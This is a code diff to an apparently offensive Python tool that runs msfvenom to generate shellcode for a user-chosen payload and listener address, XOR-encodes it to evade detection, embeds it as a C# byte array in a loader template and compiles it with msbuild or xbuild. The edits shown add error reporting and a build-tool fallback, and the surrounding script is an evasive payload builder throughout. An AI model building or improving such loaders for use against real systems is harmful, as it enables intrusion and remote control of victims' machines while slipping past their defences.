@@ -24,10 +24,11 @@ args = parser.parse_args()
 
 # Generate the shellcode given the preferred payload
 print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)
+result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 if result.returncode != 0:
-    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")
+    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
+    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")
 
 # simple obfuscation
 letters = string.ascii_lowercase
@@ -42,7 +43,7 @@ payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replac
 payload = xor(payload, args.key)
 
 payLen = len(payload)
-payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
+payload = re.sub("(.{65})", "\\1\n", ','.join(payload), count=0, flags=re.DOTALL)
 
 payloadFormatted = f"byte[] [bufnaam] = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"
 
@@ -64,9 +65,13 @@ schrijven('raw/meth.cs', template)
 
 
 #build it
-result = subprocess.run(['xbuild', 'meuk/meth/meth.csproj'], stdout=subprocess.PIPE)
-print(result.stdout)
-
+import shutil
+build_cmd = 'msbuild' if shutil.which('msbuild') else 'xbuild'
+try:
+    result = subprocess.run([build_cmd, 'meuk/meth/meth.csproj'], stdout=subprocess.PIPE)
+    print(result.stdout)
+except:
+    print('Oepsie')
 
 
 
